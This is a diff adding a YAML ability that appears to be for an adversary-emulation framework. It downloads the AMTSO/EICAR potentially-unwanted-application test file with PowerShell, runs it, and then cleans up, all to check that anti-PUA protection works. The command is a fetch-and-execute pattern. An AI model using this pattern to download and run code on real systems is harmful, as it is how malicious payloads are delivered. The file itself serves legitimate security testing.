@@ -1,0 +1,27 @@
+---
+- id: 03a80d4a4c02d99295b5901ee695cc79
+  name: Potentially Unwanted Applications (PUA)
+  description: 'The Potentially Unwanted Applications (PUA) protection feature in
+    antivirus software can identify and block PUAs from downloading and installing
+    on endpoints in your network. These applications are not considered viruses, malware,
+    or other types of threats, but might perform actions on endpoints that adversely
+    affect their performance or use. This file is similar to EICAR test virus file,
+    but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS
+    (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe
+          -OutFile $env:TEMP/PotentiallyUnwanted.exe; & "$env:TEMP/PotentiallyUnwanted.exe"
+        payloads: []
+        cleanup: Stop-Process -name PotentiallyUnwanted; Remove-Item $env:TEMP/PotentiallyUnwanted.exe
+          -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
